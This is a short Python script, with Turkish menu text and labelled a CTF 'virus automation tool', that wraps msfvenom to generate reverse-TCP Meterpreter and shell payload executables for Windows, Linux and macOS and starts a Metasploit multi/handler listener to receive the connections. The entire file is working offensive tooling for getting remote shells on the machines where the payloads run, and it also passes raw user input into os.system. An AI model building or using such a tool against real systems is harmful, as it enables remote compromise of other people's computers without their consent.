import os
import sys
from datetime import datetime

def create_payload(ip, port, platform):
    payloads = {
        "windows": ("windows/meterpreter/reverse_tcp", "exe"),
        "linux": ("linux/x86/meterpreter/reverse_tcp", "elf"),
        "mac": ("osx/x86/shell_reverse_tcp", "macho")
    }

    if platform.lower() not in payloads:
        print("[-] Desteklenmeyen platform.")
        sys.exit(1)

    payload, file_ext = payloads[platform.lower()]
    filename = f"payload_{platform}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{file_ext}"

    print(f"[+] Payload oluşturuluyor: {filename}")
    cmd = f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {file_ext} -o {filename}"
    os.system(cmd)
    print("[+] Payload oluşturuldu.")

def start_listener(ip, port, payload):
    print("[+] Dinleyici başlatılıyor...")
    rc_file = "listener.rc"
    with open(rc_file, "w") as f:
        f.write(f"use exploit/multi/handler\n")
        f.write(f"set payload {payload}\n")
        f.write(f"set LHOST {ip}\n")
        f.write(f"set LPORT {port}\n")
        f.write("set ExitOnSession false\n")
        f.write("exploit -j\n")

    os.system(f"msfconsole -r {rc_file}")

def show_menu():
    print("""
CTF Virus Otomasyon Aracı
-------------------------
1. Payload Oluştur
2. Dinleyici Başlat
3. Çıkış
    """)

if __name__ == "__main__":
    while True:
        show_menu()
        choice = input("Seçiminiz: ")

        if choice == "1":
            ip = input("LHOST (IP adresiniz): ")
            port = input("LPORT (Port): ")
            platform = input("Platform (windows/linux/mac): ")
            create_payload(ip, port, platform)
        elif choice == "2":
            ip = input("LHOST (Dinleyici IP): ")
            port = input("LPORT (Dinleyici Port): ")
            payload = input("Payload Tipi (örn: windows/meterpreter/reverse_tcp): ")
            start_listener(ip, port, payload)
        elif choice == "3":
            print("Çıkılıyor...")
            break
        else:
            print("[-] Geçersiz seçim.")
